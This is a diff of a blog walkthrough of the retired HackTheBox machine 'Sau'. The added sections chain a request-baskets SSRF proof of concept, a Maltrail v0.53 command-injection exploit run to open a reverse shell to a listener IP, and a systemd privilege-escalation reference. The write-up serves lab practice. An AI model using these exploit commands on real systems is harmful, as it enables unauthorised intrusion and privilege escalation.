@@ -1,7 +1,7 @@
 ---
 layout: post
 title: Sau
-date: 2025-07-15 02:34:00 +0800
+date: 2025-07-18 02:34:00 +0800
 categories: [HackTheBox, Easy]
 tags: [Vulnerability Assessment, Enterprise Network, Default Credentials, Weak Permissions]
 author: klein
@@ -10,7 +10,7 @@ image:
   
 ---
 
-This notes-style walkthrough is going to be conducted using the help of HackTheBox Guided Mode for this retired machine.
+This notes-style walkthrough will be conducted using HackTheBox Guided Mode for this retired machine.
 
 ###### Which is the highest open TCP port on the target machine?
 
@@ -22,15 +22,15 @@ nmap -sC -sV -vv -oN sau 10.129.229.26
 
 ![b](/images/images-sau/image_01.png)
 
-###### What is the name of the open source software that the application on 55555 is "powered by"?
+###### What is the name of the open-source software that the application on 55555 is "powered by"?
 
-By going to the web page we can find out the software that powers this application.
+By going to the web page, we can find out the software that powers this application.
 
 ![b](/images/images-sau/image_02.png)
 
 ###### What is the version of request-baskets running on Sau?
 
-As can be seen from the previous image the version number is 1.2.1
+As can be seen from the previous image, the version number is 1.2.1
 
 ###### What is the 2023 CVE ID for a Server-Side Request Forgery (SSRF) in this version of request-baskets?
 
@@ -44,3 +44,72 @@ request-baskets 1.2.1 exploit
 
 ###### What is the name of the software that the application running on port 80 is "powered by"?
 
+I used this POC exploit to progress further.
+https://github.com/entr0pie/CVE-2023-27163
+
+```bash
+./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:80 
+```
+
+![b](/images/images-sau/image_05.png)
+
+By visiting that link, we get access to the web page on port 80.
+
+![b](/images/images-sau/image_06.png)
+
+###### There is an unauthenticated command injection vulnerability in MailTrail v0.53. What is the relative path on the webserver targeted by this exploit?
+
+With a quick Google search, I found this exploit:
+
+https://github.com/spookier/Maltrail-v0.53-Exploit
+
+By taking a look at the exploit code, it looks like it is targeting the /login path.
+
+![b](/images/images-sau/image_07.png)
+
+###### What system user is the Mailtrack application running as on Sau?
+
+By doing a quick Google search, I found a POC exploit for Mailtrail.
+
+https://github.com/spookier/Maltrail-v0.53-Exploit
+
+By simply running the exploit, I got a reverse shell on the box.
+
+```bash
+python3 exploit.py 10.10.14.246 4444 http://10.129.189.107:55555/rcwlye
+
+```
+
+!\[b\](/images/images-sau/image_08.png)
+
+###### What is the full path to the binary (without arguments) that the puma user can run as root on Sau?
+
+Let's see what puma can run as root.
+
+```bash
+sudo -l
+```
+
+!\[b\](/images/images-sau/image_09.png)
+
+###### What is the full version string for the instance of systemd installed on Sau?
+
+```bash
+/usr/bin/systemctl --version
+```
+
+!\[b\](/images/images-sau/image_10.png)
+
+###### What is the 2023 CVE ID for a local privilege escalation vulnerability in this version of systemd?
+
+A quick Google search revealed the ID right away.
+
+!\[b\](/images/images-sau/image_11.png)
+
+###### Submit the flag located in the root user's home directory.
+
+To get the root user's flag, we need to escalate privileges with the previously found CVE. I found a short and straight to the point write up on this. 
+
+https://medium.com/@zenmoviefornotification/saidov-maxim-cve-2023-26604-c1232a526ba7
+
+!\[b\](/images/images-sau/image_12.png)
